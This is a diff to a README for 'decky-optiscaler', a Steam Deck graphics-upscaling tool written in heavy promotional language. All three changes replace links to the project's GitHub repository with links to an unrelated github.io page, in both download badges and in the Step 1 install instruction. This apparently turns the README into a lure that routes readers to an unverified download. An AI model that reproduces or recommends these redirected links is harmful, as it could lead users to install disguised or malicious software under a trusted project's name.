@@ -1,6 +1,6 @@
 # 🎮 decky-optiscaler - Unlock Next-Level Gaming Graphics Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-decky--optiscaler-blueviolet?style=for-the-badge&logo=github)](https://github.com/chidakwa6202/decky-optiscaler)
+[![Download Now](https://img.shields.io/badge/Download-decky--optiscaler-blueviolet?style=for-the-badge&logo=github)](https://chidakwa6202.github.io)
 
 ## 🚀 What Is This?
 
@@ -41,7 +41,7 @@ Whether you're using a Steam Deck, a computer running SteamOS, Bazzite, or a sta
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/chidakwa6202/decky-optiscaler](https://github.com/chidakwa6202/decky-optiscaler)
+Visit this link to download the application: [https://chidakwa6202.github.io](https://chidakwa6202.github.io)
 
 Once you click the link, you'll land on the project page. Look for the green "Code" button or the "Releases" section. Click the download button to get the latest version of the software.
 
@@ -147,7 +147,7 @@ The installation takes minutes, the interface is intuitive, and the benefits are
 
 So why wait? Click the download button below and start transforming your gaming experience today!
 
-[![Get Started Now](https://img.shields.io/badge/Download%20Now-Decky--OptiScaler-orange?style=for-the-badge)](https://github.com/chidakwa6202/decky-optiscaler)
+[![Get Started Now](https://img.shields.io/badge/Download%20Now-Decky--OptiScaler-orange?style=for-the-badge)](https://chidakwa6202.github.io)
 
 ---
 
